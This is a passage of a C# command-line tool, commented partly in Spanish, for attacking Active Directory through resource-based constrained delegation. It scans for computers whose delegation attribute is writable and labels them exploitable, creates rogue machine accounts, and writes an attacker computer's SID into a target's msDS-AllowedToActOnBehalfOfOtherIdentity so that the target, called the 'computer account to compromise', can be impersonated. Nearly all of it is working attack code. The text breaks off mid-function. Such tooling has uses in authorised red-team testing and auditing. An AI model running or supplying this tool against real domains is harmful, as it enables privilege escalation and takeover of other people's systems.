using System;
using System.Collections.Generic;
using System.Diagnostics.Eventing.Reader;
using System.DirectoryServices.Protocols;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

namespace RBCD_Configurator
{
    class Program
    {
        // GUID del atributo msDS-AllowedToActOnBehalfOfOtherIdentity
        private static readonly Guid RBCD_ATTRIBUTE_GUID = new Guid("3f78c3e5-f79a-46bd-a0b8-9d18116ddc79");

        // SID del principal "Self" que queremos filtrar
        private static readonly string SELF_SID = "S-1-5-10";

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                ShowUsage();
                return;
            }

            string command = args[0].ToLower();

            // Modo verificación
            if (command == "-verify" || command == "--verify")
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("[!] Error: Domain required for verification mode");
                    Console.WriteLine("Usage: rbcd_manager.exe -verify <domain>");
                    Console.WriteLine("Example: rbcd_manager.exe -verify CONTOSO.LOCAL");
                    return;
                }

                string domainName = args[1];
                try
                {
                    VerifyRBCDPermissions(domainName);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Error: " + ex.Message);
                    Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
                }
                return;
            }

            // Modo listar configuraciones RBCD
            if (command == "-list" || command == "--list")
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("[!] Error: Domain required for list mode");
                    Console.WriteLine("Usage: rbcd_manager.exe -list <domain>");
                    Console.WriteLine("Example: rbcd_manager.exe -list CONTOSO.LOCAL");
                    return;
                }

                string domainName = args[1];
                try
                {
                    ListRBCDConfigurations(domainName);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Error: " + ex.Message);
                    Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
                }
                return;
            }

            // Modo crear cuenta de computadora
            if (command == "-create" || command == "--create")
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("[!] Error: Computer name and domain required");
                    Console.WriteLine("Usage: rbcd_manager.exe -create <computer_name> <domain> [password]");
                    Console.WriteLine("Example: rbcd_manager.exe -create FAKE01 CONTOSO.LOCAL MyP@ssw0rd");
                    return;
                }

                string computerName = args[1];
                string domain = args[2];
                string password = args.Length >= 4 ? args[3] : GenerateRandomPassword();

                try
                {
                    CreateComputerAccount(computerName, domain, password);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Error: " + ex.Message);
                    Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
                }
                return;
            }

            // Modo remover RBCD
            if (command == "-remove" || command == "--remove")
            {
                if (args.Length < 3)
                {
                    Console.WriteLine("[!] Error: Target computer and domain required");
                    Console.WriteLine("Usage: rbcd_manager.exe -remove <target_computer> <domain> [attacker_computer]");
                    Console.WriteLine("Example: rbcd_manager.exe -remove WEB01 CONTOSO.LOCAL ATTACKER01");
                    Console.WriteLine("         rbcd_manager.exe -remove WEB01 CONTOSO.LOCAL (removes all RBCD)");
                    return;
                }

                string targetComputer = args[1];
                string domain = args[2];
                string attackerComputer = args.Length >= 4 ? args[3] : null;

                try
                {
                    RemoveRBCD(targetComputer, domain, attackerComputer);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[!] Error: " + ex.Message);
                    Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
                }
                return;
            }

            // Modo configuración RBCD
            if (args.Length < 3)
            {
                ShowUsage();
                return;
            }

            string targetComp = args[0];
            string attackerComp = args[1];
            string dom = args[2];

            try
            {
                ConfigureRBCD(targetComp, attackerComp, dom);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error: " + ex.Message);
                Console.WriteLine("[!] Stack trace: " + ex.StackTrace);
            }
        }

        static void ShowUsage()
        {
            Console.WriteLine(@"
RBCD Configurator - Resource-Based Constrained Delegation Tool

Usage:
  [1] Configuration Mode:
      rbcd_manager.exe <target_computer> <attacker_computer> <domain>
      
      Arguments:
        target_computer   - Computer account to compromise (will have RBCD configured)
        attacker_computer - Computer account that will be allowed to delegate to target
        domain            - Domain name (e.g., CONTOSO.LOCAL)
      
      Example: rbcd_manager.exe WEB01 ATTACKER01 CONTOSO.LOCAL

  [2] Verification Mode:
      rbcd_manager.exe -verify <domain>
      
      This mode enumerates computers where principals OTHER THAN 'Self' have WriteProperty
      permissions on the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.
      
      Example: rbcd_manager.exe -verify CONTOSO.LOCAL

  [3] List RBCD Configurations:
      rbcd_manager.exe -list <domain>
      
      Lists all computers in the domain and shows which principals are allowed to
      delegate to them via RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity attribute).
      
      Example: rbcd_manager.exe -list CONTOSO.LOCAL

  [4] Create Computer Account:
      rbcd_manager.exe -create <computer_name> <domain> [password]
      
      Creates a new computer account in the domain. If no password is provided,
      a random secure password will be generated.
      
      Example: rbcd_manager.exe -create FAKE01 CONTOSO.LOCAL MyP@ssw0rd
               rbcd_manager.exe -create FAKE01 CONTOSO.LOCAL

  [5] Remove RBCD Configuration:
      rbcd_manager.exe -remove <target_computer> <domain> [attacker_computer]
      
      Removes RBCD configuration from a target computer.
      - If attacker_computer is specified: removes only that specific SID
      - If attacker_computer is omitted: removes ALL RBCD configuration
      
      Example: rbcd_manager.exe -remove WEB01 CONTOSO.LOCAL ATTACKER01
               rbcd_manager.exe -remove WEB01 CONTOSO.LOCAL

Note: Computer names can be with or without $ suffix.
      Will use current security context for authentication.
");
        }

        static string GenerateRandomPassword()
        {
            const string validChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
            StringBuilder password = new StringBuilder();
            Random random = new Random();

            for (int i = 0; i < 24; i++)
            {
                password.Append(validChars[random.Next(validChars.Length)]);
            }

            return password.ToString();
        }

        static void CreateComputerAccount(string computerName, string domain, string password)
        {
            if (!computerName.EndsWith("$"))
                computerName += "$";

            Console.WriteLine("[*] Creating computer account: " + computerName);
            Console.WriteLine("[*] Domain: " + domain);
            Console.WriteLine("[*] Using: " + WindowsIdentity.GetCurrent().Name);
            Console.WriteLine();

            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domain));
            ldapConnection.SessionOptions.ProtocolVersion = 3;
            ldapConnection.SessionOptions.SecureSocketLayer = false;
            ldapConnection.SessionOptions.Sealing = true;
            ldapConnection.SessionOptions.Signing = true;
            ldapConnection.AuthType = AuthType.Negotiate;

            try
            {
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated to " + domain);
            }
            catch (LdapException ex)
            {
                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
                ldapConnection.AuthType = AuthType.Kerberos;
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated with Kerberos");
            }

            // Verificar si la cuenta ya existe
            try
            {
                string existingDN = FindComputerDN(ldapConnection, computerName, domain);
                Console.WriteLine("[!] Computer account already exists: " + existingDN);
                ldapConnection.Dispose();
                return;
            }
            catch
            {
                // No existe, continuar con la creación
                Console.WriteLine("[+] Computer account does not exist, proceeding with creation");
            }

            string searchBase = "DC=" + domain.Replace(".", ",DC=");
            string computersContainer = "CN=Computers," + searchBase;
            string computerDN = "CN=" + computerName.TrimEnd('$') + "," + computersContainer;

            Console.WriteLine("[*] Target DN: " + computerDN);
            Console.WriteLine("[*] Password length: " + password.Length + " characters");

            // Crear cuenta con password desde el inicio
            Console.WriteLine("[*] Attempting creation with password...");

            try
            {
                AddRequest addRequest = new AddRequest(computerDN);
                addRequest.Attributes.Add(new DirectoryAttribute("objectClass", "computer"));
                addRequest.Attributes.Add(new DirectoryAttribute("sAMAccountName", computerName));

                string quotedPassword = "\"" + password + "\"";
                byte[] passwordBytes = Encoding.Unicode.GetBytes(quotedPassword);
                addRequest.Attributes.Add(new DirectoryAttribute("unicodePwd", passwordBytes));
                addRequest.Attributes.Add(new DirectoryAttribute("userAccountControl", "4096"));

                string dnsHostname = computerName.TrimEnd('$') + "." + domain.ToLower();
                addRequest.Attributes.Add(new DirectoryAttribute("dNSHostName", dnsHostname));
                addRequest.Attributes.Add(new DirectoryAttribute("servicePrincipalName", new string[] {
                    "HOST/" + computerName.TrimEnd('$'),
                    "HOST/" + dnsHostname,
                    "RestrictedKrbHost/" + computerName.TrimEnd('$'),
                    "RestrictedKrbHost/" + dnsHostname
                }));

                AddResponse addResponse = (AddResponse)ldapConnection.SendRequest(addRequest);
                Console.WriteLine("[+] Computer account created successfully (with password)!");
                Console.WriteLine("[+] DN: " + computerDN);
                Console.WriteLine("[+] Password: " + password);
                Console.WriteLine();
                Console.WriteLine("[*] IMPORTANT: Save this password, it cannot be retrieved later!");
                ldapConnection.Dispose();
                return;
            }
            catch (DirectoryOperationException ex)
            {
                Console.WriteLine("[!] Creation with password failed: " + ex.Response.ResultCode);
                Console.WriteLine("[!] Error message: " + ex.Message);

                if (ex.Response.ErrorMessage != null && ex.Response.ErrorMessage.Length > 0)
                {
                    Console.WriteLine("[!] Extended error: " + ex.Response.ErrorMessage);
                }

                if (ex.Response.ResultCode == ResultCode.InsufficientAccessRights)
                {
                    Console.WriteLine();
                    Console.WriteLine("[!] Insufficient permissions to create computer account");
                    Console.WriteLine("[!] Required permissions:");
                    Console.WriteLine("    - 'Create Computer Objects' in the Computers container");
                    Console.WriteLine("    - Or be member of 'Account Operators' or 'Domain Admins'");
                }
                else if (ex.Response.ResultCode == ResultCode.UnwillingToPerform)
                {
                    Console.WriteLine();
                    Console.WriteLine("[!] Server refused to perform the operation");
                    Console.WriteLine("[!] Possible causes:");
                    Console.WriteLine("    - Password complexity requirements not met");
                    Console.WriteLine("    - Machine account quota exceeded (default is 10 per user)");
                    Console.WriteLine("    - Connection not encrypted (password transmission)");
                    Console.WriteLine();
                    Console.WriteLine("[*] Current password: " + password);
                    Console.WriteLine("[*] Try checking: ms-DS-MachineAccountQuota attribute on domain");
                }
                else if (ex.Response.ResultCode == ResultCode.ConstraintViolation)
                {
                    Console.WriteLine();
                    Console.WriteLine("[!] Constraint violation - Password doesn't meet requirements");
                }

                ldapConnection.Dispose();
                return;
            }
        }

        static void ListRBCDConfigurations(string domainName)
        {
            Console.WriteLine("[*] Listing RBCD configurations");
            Console.WriteLine("[*] Domain: " + domainName);
            Console.WriteLine("[*] Current user: " + WindowsIdentity.GetCurrent().Name);
            Console.WriteLine();

            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domainName));
            ldapConnection.SessionOptions.ProtocolVersion = 3;
            ldapConnection.AuthType = AuthType.Negotiate;

            try
            {
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated to " + domainName);
            }
            catch (LdapException ex)
            {
                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
                ldapConnection.AuthType = AuthType.Kerberos;
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated with Kerberos");
            }

            Console.WriteLine("[*] Enumerating computers in domain...");
            List<string> computers = GetAllComputers(ldapConnection, domainName);
            Console.WriteLine("[+] Found " + computers.Count + " computers");
            Console.WriteLine();

            Console.WriteLine("================================================================================");
            Console.WriteLine(String.Format("{0,-30} {1}", "Name", "PrincipalsAllowedToDelegateToAccount"));
            Console.WriteLine(String.Format("{0,-30} {1}", "----", "------------------------------------"));

            int configuredCount = 0;

            foreach (string computerDN in computers)
            {
                string computerName = GetComputerNameFromDN(computerDN);
                List<string> allowedPrincipals = GetRBCDConfiguration(ldapConnection, computerDN, domainName);

                if (allowedPrincipals.Count > 0)
                {
                    configuredCount++;
                    Console.WriteLine(String.Format("{0,-30} {{{1}}}", computerName, String.Join(", ", allowedPrincipals)));
                }
                else
                {
                    Console.WriteLine(String.Format("{0,-30} {{}}", computerName));
                }
            }

            Console.WriteLine("================================================================================");
            Console.WriteLine();
            Console.WriteLine("[+] Total computers: " + computers.Count);
            Console.WriteLine("[+] Computers with RBCD configured: " + configuredCount);
            Console.WriteLine("[+] Computers without RBCD: " + (computers.Count - configuredCount));

            ldapConnection.Dispose();
        }

        static string GetComputerNameFromDN(string distinguishedName)
        {
            // Extrae el nombre de la computadora del DN
            // Ejemplo: "CN=LON-DC-1,OU=Domain Controllers,DC=contoso,DC=com" -> "LON-DC-1"
            if (distinguishedName.StartsWith("CN="))
            {
                int startIndex = 3; // Después de "CN="
                int endIndex = distinguishedName.IndexOf(',');
                if (endIndex > startIndex)
                {
                    return distinguishedName.Substring(startIndex, endIndex - startIndex);
                }
            }
            return distinguishedName;
        }

        static List<string> GetRBCDConfiguration(LdapConnection connection, string distinguishedName, string domain)
        {
            List<string> allowedPrincipals = new List<string>();

            try
            {
                SearchRequest searchRequest = new SearchRequest(
                    distinguishedName,
                    "(objectClass=*)",
                    SearchScope.Base,
                    new string[] { "msDS-AllowedToActOnBehalfOfOtherIdentity" }
                );

                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                if (searchResponse.Entries.Count == 0)
                    return allowedPrincipals;

                if (!searchResponse.Entries[0].Attributes.Contains("msDS-AllowedToActOnBehalfOfOtherIdentity"))
                    return allowedPrincipals;

                byte[] securityDescriptor = searchResponse.Entries[0].Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"][0] as byte[];

                if (securityDescriptor == null || securityDescriptor.Length == 0)
                    return allowedPrincipals;

                RawSecurityDescriptor sd = new RawSecurityDescriptor(securityDescriptor, 0);

                foreach (CommonAce ace in sd.DiscretionaryAcl)
                {
                    string sid = ace.SecurityIdentifier.Value;
                    string principalDN = ResolveSidToDN(connection, sid, domain);
                    if (!string.IsNullOrEmpty(principalDN))
                    {
                        allowedPrincipals.Add(principalDN);
                    }
                }
            }
            catch (Exception)
            {
                // Ignorar errores en computadoras individuales
            }

            return allowedPrincipals;
        }

        static string ResolveSidToDN(LdapConnection connection, string sid, string domain)
        {
            try
            {
                string searchBase = "DC=" + domain.Replace(".", ",DC=");
                string filter = "(objectSid=" + ConvertSidToSearchFilter(sid) + ")";

                SearchRequest searchRequest = new SearchRequest(
                    searchBase,
                    filter,
                    SearchScope.Subtree,
                    new string[] { "distinguishedName" }
                );

                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                if (searchResponse.Entries.Count > 0)
                {
                    return searchResponse.Entries[0].DistinguishedName;
                }
            }
            catch (Exception)
            {
                // Si no se puede resolver, retornar el SID
            }

            return "SID=" + sid;
        }

        static void RemoveRBCD(string targetComputer, string domain, string attackerComputer)
        {
            if (!targetComputer.EndsWith("$"))
                targetComputer += "$";

            Console.WriteLine("[*] Removing RBCD configuration from: " + targetComputer);
            Console.WriteLine("[*] Domain: " + domain);
            Console.WriteLine("[*] Using: " + WindowsIdentity.GetCurrent().Name);

            if (attackerComputer != null)
            {
                if (!attackerComputer.EndsWith("$"))
                    attackerComputer += "$";
                Console.WriteLine("[*] Removing specific SID: " + attackerComputer);
            }
            else
            {
                Console.WriteLine("[*] Removing ALL RBCD configuration");
            }

            Console.WriteLine();

            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domain));
            ldapConnection.SessionOptions.ProtocolVersion = 3;
            ldapConnection.AuthType = AuthType.Negotiate;

            try
            {
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated to " + domain);
            }
            catch (LdapException ex)
            {
                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
                ldapConnection.AuthType = AuthType.Kerberos;
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated with Kerberos");
            }

            Console.WriteLine("[*] Searching for " + targetComputer);
            string targetDN = FindComputerDN(ldapConnection, targetComputer, domain);
            Console.WriteLine("[+] Found target: " + targetDN);

            byte[] existingSD = GetExistingSecurityDescriptor(ldapConnection, targetDN);

            if (existingSD == null || existingSD.Length == 0)
            {
                Console.WriteLine("[!] No RBCD configuration found on target computer");
                ldapConnection.Dispose();
                return;
            }

            if (attackerComputer == null)
            {
                // Remover toda la configuración RBCD
                Console.WriteLine("[*] Clearing all RBCD configuration...");
                ModifyAttribute(ldapConnection, targetDN, "msDS-AllowedToActOnBehalfOfOtherIdentity", null);
                Console.WriteLine("[+] All RBCD configuration removed successfully!");
            }
            else
            {
                // Remover solo un SID específico
                Console.WriteLine("[*] Searching for " + attackerComputer);
                string attackerDN = FindComputerDN(ldapConnection, attackerComputer, domain);
                Console.WriteLine("[+] Found attacker: " + attackerDN);

                string attackerSid = GetObjectSid(ldapConnection, attackerDN);
                Console.WriteLine("[+] Attacker SID: " + attackerSid);

                string newSD = RemoveSidFromSecurityDescriptor(existingSD, attackerSid);

                if (newSD == null)
                {
                    Console.WriteLine("[!] SID not found in RBCD configuration");
                }
                else
                {
                    ModifyAttribute(ldapConnection, targetDN, "msDS-AllowedToActOnBehalfOfOtherIdentity", newSD);
                    Console.WriteLine("[+] RBCD configuration updated successfully!");
                    Console.WriteLine("[+] Removed " + attackerComputer + " from delegation list");
                }
            }

            ldapConnection.Dispose();
        }

        static string RemoveSidFromSecurityDescriptor(byte[] existingSDBytes, string sidToRemove)
        {
            RawSecurityDescriptor sd = new RawSecurityDescriptor(existingSDBytes, 0);
            Console.WriteLine("[*] Current RBCD entries: " + sd.DiscretionaryAcl.Count);

            bool sidFound = false;
            int indexToRemove = -1;

            for (int i = 0; i < sd.DiscretionaryAcl.Count; i++)
            {
                CommonAce ace = sd.DiscretionaryAcl[i] as CommonAce;
                if (ace != null && ace.SecurityIdentifier.Value == sidToRemove)
                {
                    sidFound = true;
                    indexToRemove = i;
                    break;
                }
            }

            if (!sidFound)
            {
                return null;
            }

            sd.DiscretionaryAcl.RemoveAce(indexToRemove);
            Console.WriteLine("[+] SID removed. Remaining entries: " + sd.DiscretionaryAcl.Count);

            if (sd.DiscretionaryAcl.Count == 0)
            {
                Console.WriteLine("[*] No more entries, will clear the attribute entirely");
                return "";
            }

            byte[] sdBytes = new byte[sd.BinaryLength];
            sd.GetBinaryForm(sdBytes, 0);
            return Convert.ToBase64String(sdBytes);
        }

        static void VerifyRBCDPermissions(string domainName)
        {
            Console.WriteLine("[*] Starting RBCD permissions verification");
            Console.WriteLine("[*] Domain: " + domainName);
            Console.WriteLine("[*] Current user: " + WindowsIdentity.GetCurrent().Name);
            Console.WriteLine();

            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domainName));
            ldapConnection.SessionOptions.ProtocolVersion = 3;
            ldapConnection.AuthType = AuthType.Negotiate;

            try
            {
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated to " + domainName);
            }
            catch (LdapException ex)
            {
                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
                ldapConnection.AuthType = AuthType.Kerberos;
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated with Kerberos");
            }

            string currentUserSid = WindowsIdentity.GetCurrent().User.Value;
            Console.WriteLine("[*] Current user SID: " + currentUserSid);
            Console.WriteLine();

            Console.WriteLine("[*] Enumerating computers in domain...");
            List<string> computers = GetAllComputers(ldapConnection, domainName);
            Console.WriteLine("[+] Found " + computers.Count + " computers");
            Console.WriteLine();

            Console.WriteLine("[*] Checking RBCD WriteProperty permissions...");
            Console.WriteLine("[*] Filtering out computers where only 'Self' has permissions...");
            Console.WriteLine("================================================================================");

            int vulnerableCount = 0;
            int totalWithPermissions = 0;

            foreach (string computerDN in computers)
            {
                List<string> permittedSids = CheckRBCDPermissions(ldapConnection, computerDN);

                if (permittedSids.Count > 0)
                {
                    totalWithPermissions++;

                    List<string> filteredSids = new List<string>();
                    foreach (string sid in permittedSids)
                    {
                        if (sid != SELF_SID)
                        {
                            filteredSids.Add(sid);
                        }
                    }

                    if (filteredSids.Count > 0)
                    {
                        vulnerableCount++;
                        Console.WriteLine();
                        Console.WriteLine("Computer: " + computerDN);
                        Console.WriteLine("Principals with WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity:");

                        foreach (string sid in filteredSids)
                        {
                            string accountName = ResolveSidToName(ldapConnection, sid, domainName);
                            Console.WriteLine("  - SID: " + sid);
                            Console.WriteLine("    Name: " + accountName);
                        }
                    }
                }
            }

            Console.WriteLine();
            Console.WriteLine("================================================================================");
            Console.WriteLine("[+] Verification complete!");
            Console.WriteLine("[+] Total computers analyzed: " + computers.Count);
            Console.WriteLine("[+] Computers with any RBCD permissions: " + totalWithPermissions);
            Console.WriteLine("[+] Computers with exploitable RBCD permissions (excluding Self): " + vulnerableCount);

            if (vulnerableCount == 0)
            {
                Console.WriteLine();
                Console.WriteLine("[*] No exploitable RBCD misconfigurations found.");
                Console.WriteLine("[*] All computers only have 'Self' permissions (default/secure configuration).");
            }

            ldapConnection.Dispose();
        }

        static List<string> GetAllComputers(LdapConnection connection, string domain)
        {
            List<string> computers = new List<string>();
            string searchBase = "DC=" + domain.Replace(".", ",DC=");
            string filter = "(objectClass=computer)";

            SearchRequest searchRequest = new SearchRequest(
                searchBase,
                filter,
                SearchScope.Subtree,
                new string[] { "distinguishedName" }
            );

            PageResultRequestControl pageControl = new PageResultRequestControl(1000);
            searchRequest.Controls.Add(pageControl);

            while (true)
            {
                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                foreach (SearchResultEntry entry in searchResponse.Entries)
                {
                    computers.Add(entry.DistinguishedName);
                }

                PageResultResponseControl pageResponse = (PageResultResponseControl)searchResponse.Controls[0];

                if (pageResponse.Cookie.Length == 0)
                    break;

                pageControl.Cookie = pageResponse.Cookie;
            }

            return computers;
        }

        static List<string> CheckRBCDPermissions(LdapConnection connection, string distinguishedName)
        {
            List<string> permittedSids = new List<string>();

            try
            {
                SearchRequest searchRequest = new SearchRequest(
                    distinguishedName,
                    "(objectClass=*)",
                    SearchScope.Base,
                    new string[] { "nTSecurityDescriptor" }
                );

                SecurityDescriptorFlagControl sdControl = new SecurityDescriptorFlagControl();
                sdControl.SecurityMasks = SecurityMasks.Dacl;
                searchRequest.Controls.Add(sdControl);

                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                if (searchResponse.Entries.Count == 0)
                    return permittedSids;

                byte[] ntSecurityDescriptor = searchResponse.Entries[0].Attributes["nTSecurityDescriptor"][0] as byte[];
                RawSecurityDescriptor sd = new RawSecurityDescriptor(ntSecurityDescriptor, 0);

                foreach (GenericAce genericAce in sd.DiscretionaryAcl)
                {
                    ObjectAce objectAce = genericAce as ObjectAce;
                    if (objectAce == null)
                        continue;

                    if (objectAce.AceQualifier != AceQualifier.AccessAllowed)
                        continue;

                    if ((objectAce.AccessMask & 0x20) == 0)
                        continue;

                    if (objectAce.ObjectAceType == RBCD_ATTRIBUTE_GUID)
                    {
                        string sidValue = objectAce.SecurityIdentifier.Value;
                        if (!permittedSids.Contains(sidValue))
                        {
                            permittedSids.Add(sidValue);
                        }
                    }
                }
            }
            catch (Exception)
            {
                // Ignorar errores en computadoras individuales
            }

            return permittedSids;
        }

        static string ResolveSidToName(LdapConnection connection, string sid, string domain)
        {
            try
            {
                string searchBase = "DC=" + domain.Replace(".", ",DC=");
                string filter = "(objectSid=" + ConvertSidToSearchFilter(sid) + ")";

                SearchRequest searchRequest = new SearchRequest(
                    searchBase,
                    filter,
                    SearchScope.Subtree,
                    new string[] { "sAMAccountName", "distinguishedName" }
                );

                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

                if (searchResponse.Entries.Count > 0)
                {
                    if (searchResponse.Entries[0].Attributes.Contains("sAMAccountName"))
                    {
                        return searchResponse.Entries[0].Attributes["sAMAccountName"][0].ToString();
                    }
                    return searchResponse.Entries[0].DistinguishedName;
                }
            }
            catch (Exception)
            {
                // Si no se puede resolver, retornar el SID
            }

            return "Unknown (" + sid + ")";
        }

        static string ConvertSidToSearchFilter(string sid)
        {
            SecurityIdentifier secId = new SecurityIdentifier(sid);
            byte[] sidBytes = new byte[secId.BinaryLength];
            secId.GetBinaryForm(sidBytes, 0);

            string result = "";
            foreach (byte b in sidBytes)
            {
                result += "\\" + b.ToString("x2");
            }
            return result;
        }

        static void ConfigureRBCD(string targetComputer, string attackerComputer, string domain)
        {
            if (!targetComputer.EndsWith("$"))
                targetComputer += "$";
            if (!attackerComputer.EndsWith("$"))
                attackerComputer += "$";

            Console.WriteLine("[*] Configuring RBCD for " + targetComputer);
            Console.WriteLine("[*] Using: " + WindowsIdentity.GetCurrent().Name);

            LdapConnection ldapConnection = new LdapConnection(new LdapDirectoryIdentifier(domain));
            ldapConnection.SessionOptions.ProtocolVersion = 3;
            ldapConnection.AuthType = AuthType.Negotiate;

            try
            {
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated to " + domain);
            }
            catch (LdapException ex)
            {
                Console.WriteLine("[!] LDAP bind failed: " + ex.Message);
                ldapConnection.AuthType = AuthType.Kerberos;
                ldapConnection.Bind();
                Console.WriteLine("[+] Authenticated with Kerberos");
            }

            Console.WriteLine("[*] Searching for " + targetComputer);
            string targetDN = FindComputerDN(ldapConnection, targetComputer, domain);
            Console.WriteLine("[+] Found target: " + targetDN);

            Console.WriteLine("[*] Searching for " + attackerComputer);
            string attackerDN = FindComputerDN(ldapConnection, attackerComputer, domain);
            Console.WriteLine("[+] Found attacker: " + attackerDN);

            if (!HasSPN(ldapConnection, attackerDN))
            {
                Console.WriteLine("[!] WARNING: Attacker has no SPN!");
            }
            else
            {
                Console.WriteLine("[+] Attacker has SPN registered");
            }

            string attackerSid = GetObjectSid(ldapConnection, attackerDN);
            Console.WriteLine("[+] Attacker SID: " + attackerSid);

            string targetSid = GetObjectSid(ldapConnection, targetDN);
            Console.WriteLine("[+] Target SID: " + targetSid);

            byte[] existingSD = GetExistingSecurityDescriptor(ldapConnection, targetDN);
            string newSD = AddSidToSecurityDescriptor(existingSD, attackerSid, targetSid);
            ModifyAttribute(ldapConnection, targetDN, "msDS-AllowedToActOnBehalfOfOtherIdentity", newSD);

            Console.WriteLine("[+] RBCD configured successfully!");
            Console.WriteLine("[+] " + attackerComputer + " added to delegation list for " + targetComputer);
            ldapConnection.Dispose();
        }

        static string FindComputerDN(LdapConnection connection, string computerName, string domain)
        {
            string searchBase = "DC=" + domain.Replace(".", ",DC=");
            string filter = "(&(objectClass=computer)(sAMAccountName=" + computerName + "))";

            SearchRequest searchRequest = new SearchRequest(searchBase, filter, SearchScope.Subtree, new string[] { "distinguishedName" });
            SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

            if (searchResponse.Entries.Count == 0)
            {
                throw new Exception("Computer " + computerName + " not found");
            }

            return searchResponse.Entries[0].Attributes["distinguishedName"][0].ToString();
        }

        static bool HasSPN(LdapConnection connection, string distinguishedName)
        {
            SearchRequest searchRequest = new SearchRequest(distinguishedName, "(objectClass=*)", SearchScope.Base, new string[] { "servicePrincipalName" });
            SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

            if (searchResponse.Entries.Count == 0)
            {
                return false;
            }

            return searchResponse.Entries[0].Attributes.Contains("servicePrincipalName");
        }

        static string GetObjectSid(LdapConnection connection, string distinguishedName)
        {
            SearchRequest searchRequest = new SearchRequest(distinguishedName, "(objectClass=*)", SearchScope.Base, new string[] { "objectSid" });
            SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

            if (searchResponse.Entries.Count == 0)
            {
                throw new Exception("Object not found: " + distinguishedName);
            }

            byte[] sidBytes = searchResponse.Entries[0].Attributes["objectSid"][0] as byte[];
            SecurityIdentifier sid = new SecurityIdentifier(sidBytes, 0);
            return sid.Value;
        }

        static byte[] GetExistingSecurityDescriptor(LdapConnection connection, string distinguishedName)
        {
            SearchRequest searchRequest = new SearchRequest(
                distinguishedName,
                "(objectClass=*)",
                SearchScope.Base,
                new string[] { "msDS-AllowedToActOnBehalfOfOtherIdentity" }
            );

            SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);

            if (searchResponse.Entries.Count == 0)
            {
                Console.WriteLine("[*] Target object found but no existing RBCD configured");
                return null;
            }

            if (!searchResponse.Entries[0].Attributes.Contains("msDS-AllowedToActOnBehalfOfOtherIdentity"))
            {
                Console.WriteLine("[*] No existing RBCD configuration found (attribute empty)");
                return null;
            }

            byte[] existingSD = searchResponse.Entries[0].Attributes["msDS-AllowedToActOnBehalfOfOtherIdentity"][0] as byte[];
            Console.WriteLine("[+] Found existing RBCD configuration, will append to it");
            return existingSD;
        }

        static string AddSidToSecurityDescriptor(byte[] existingSDBytes, string newSidString, string targetSidString)
        {
            SecurityIdentifier newSid = new SecurityIdentifier(newSidString);
            SecurityIdentifier targetSid = new SecurityIdentifier(targetSidString);
            RawSecurityDescriptor sd;

            if (existingSDBytes != null && existingSDBytes.Length > 0)
            {
                sd = new RawSecurityDescriptor(existingSDBytes, 0);
                Console.WriteLine("[*] Existing RBCD entries found: " + sd.DiscretionaryAcl.Count);

                foreach (CommonAce ace in sd.DiscretionaryAcl)
                {
                    if (ace.SecurityIdentifier.Value == newSidString)
                    {
                        Console.WriteLine("[!] WARNING: SID " + newSidString + " already exists in RBCD list!");
                        Console.WriteLine("[*] Skipping addition (already configured)");

                        byte[] unchangedBytes = new byte[sd.BinaryLength];
                        sd.GetBinaryForm(unchangedBytes, 0);
                        return Convert.ToBase64String(unchangedBytes);
                    }
                }

                sd.DiscretionaryAcl.InsertAce(
                    sd.DiscretionaryAcl.Count,
                    new CommonAce(
                        AceFlags.None,
                        AceQualifier.AccessAllowed,
                        0x000F01FF,
                        newSid,
                        false,
                        null
                    )
                );

                Console.WriteLine("[+] Added new SID to existing RBCD list (total entries: " + sd.DiscretionaryAcl.Count + ")");
            }
            else
            {
                Console.WriteLine("[*] Creating new RBCD configuration");
                RawAcl dacl = new RawAcl(GenericAcl.AclRevision, 1);
                dacl.InsertAce(0, new CommonAce(
                    AceFlags.None,
                    AceQualifier.AccessAllowed,
                    0x000F01FF,
                    newSid,
                    false,
                    null
                ));

                sd = new RawSecurityDescriptor(
                    ControlFlags.DiscretionaryAclPresent,
                    targetSid,
